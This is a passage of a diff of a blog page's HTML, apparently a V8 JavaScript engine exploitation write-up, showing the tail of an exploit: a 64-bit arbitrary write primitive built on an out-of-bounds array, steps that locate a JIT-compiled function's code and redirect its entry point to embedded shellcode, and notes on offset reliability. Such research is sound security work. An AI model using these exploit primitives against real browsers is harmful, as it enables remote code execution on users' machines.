-  oob[6] = itof((a &lt;&lt; 32n) &#43; p - 8n &#43; 1n);
-  flt[0] = itof(x);
+<span style=color:#75715e>/* 64-bit write primitive */</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) {
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);
+  <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
 }
 
-/* get a pointer to the foo.code object */
-let code = (read(addrof(foo) &#43; 0x18n) - 1n) &amp; 0xffffffffn;
+<span style=color:#75715e>/* get a pointer to the foo.code object */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>code</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>foo</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
 
-/* get the entry point of the compiled function */
-let entry = (read(code &#43; 0xcn));
+<span style=color:#75715e>/* get the entry point of the compiled function */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>entry</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>code</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xc</span><span style=color:#a6e22e>n</span>));
 
-/* overwrite the entry point with the start of the shellcode */
-write(code &#43; 0xcn, entry &#43; 0x69n);
+<span style=color:#75715e>/* overwrite the entry point with the start of the shellcode */</span>
+<span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>code</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xc</span><span style=color:#a6e22e>n</span>, <span style=color:#a6e22e>entry</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x69</span><span style=color:#a6e22e>n</span>);
 
-foo();
-</code></pre>
-</div>
-</p>
+<span style=color:#a6e22e>foo</span>();</code></pre></div></p>
 <p>One last thing to note, while this exploit technique does seem fairly stable, different kernel versions or platforms will affect the offsets of the immediate numbers in the JIT compiled code.</p>
 <p>This poses a slight problem as it significantly affects the reliability. Obviously techniques already exist to combat this issue - e.g. incrementing the offsets until the exploit executes successfully.</p>
 <p>I do have some ideas I&rsquo;d like to explore further around increasing exploit reliability - but those will come in another article.</p>
-<h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<h2 id=references>References</h2>
 <ul>
 <li><a href=https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8>V8 Sandbox - High-Level Design Doc</a></li>
 <li><a href=https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk>V8 Sandbox - External Pointer Sandboxing</a></li>
 <li><a href=https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html>Dice CTF Memory Hole: Breaking V8 Heap Sandbox</a></li>
 </ul>
-</div></div>
 </div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user">
-<span>Anvbis &copy; 2022</span>
-</div>
-</div>
+<footer class=content__footer></footer>
+</section>
+<footer class=page__footer><p>
+</p>
+<br><br>
+<p class=advertisement>Anvis &copy; 2023</p>
 </footer>
-<script src=https://anvbis.github.io/assets/main.js></script>
-<script src=https://anvbis.github.io/assets/prism.js></script>
 </div>
 </body>
 </html>
